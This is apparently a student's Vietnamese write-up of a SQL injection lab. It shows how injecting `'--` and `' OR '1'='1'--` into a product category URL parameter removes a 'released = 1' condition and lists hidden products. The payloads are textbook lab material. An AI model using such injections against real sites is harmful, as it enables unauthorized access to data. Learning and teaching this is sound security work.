# Đầu bài cho biết:
- Khi mà người dùng chọn 1 cái category thì trang web sẽ thực hiện 1 truy vấn là:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

# Yêu cầu: 
Làm hiển thị sản phẩm chưa được phát hành.

# Giải quyết:
![image](https://github.com/user-attachments/assets/2de27575-fc1c-4b4b-b3e8-859447217ae8)

- Khi vào bài em có thấy 1 mục các danh mục như trên, em thử chọn 1 cái danh mục thì thấy phần URL thay đổi như này:

`https://.../filter?category=Accessories`
- Vậy thì sau phần category sẽ là phần thuộc vào trong dấu '' của truy vấn SQL:

`SELECT * FROM products WHERE category = 'Accessories' AND released = 1`
- Có nghĩa là: Chọn tất cả các sản phẩm có trong bảng products với điều kiện danh mục là `Accessories` và trạng thái phát hành là `1` (tức là đã phát hành)

- Để hiển thị được tất cả các sản phẩm kể cả các sản phẩm chưa được phát hành thì cần làm mất đi `AND released = 1` bằng việc thêm `'--` trong URL (vì tất cả sau double-dash đều là comment trong MySQL):

`https://.../filter?category=Accessories'--`

Tức là truy vấn SQL sẽ như này:

`SELECT * FROM products WHERE category = 'Accessories'--' AND released = 1`

- Để hiển thị được tất cả các sản phẩm thì cần loại bỏ cả danh mục `Accessories`, vậy thì thêm vào có điều kiện `OR '1'='1'`:

`SELECT * FROM products WHERE category = 'Accessories' OR '1'='1'--' AND released = 1`

- Như vậy thì có nghĩa là nó sẽ có 2 điều kiện, 1 là `category = 'Accessories'`, 2 là `'1'='1'`. Với điều kiện 2, thì 1 bằng 1 luôn đúng, nên nó sẽ hiện lên tất cả các sản phẩm trong bảng products.
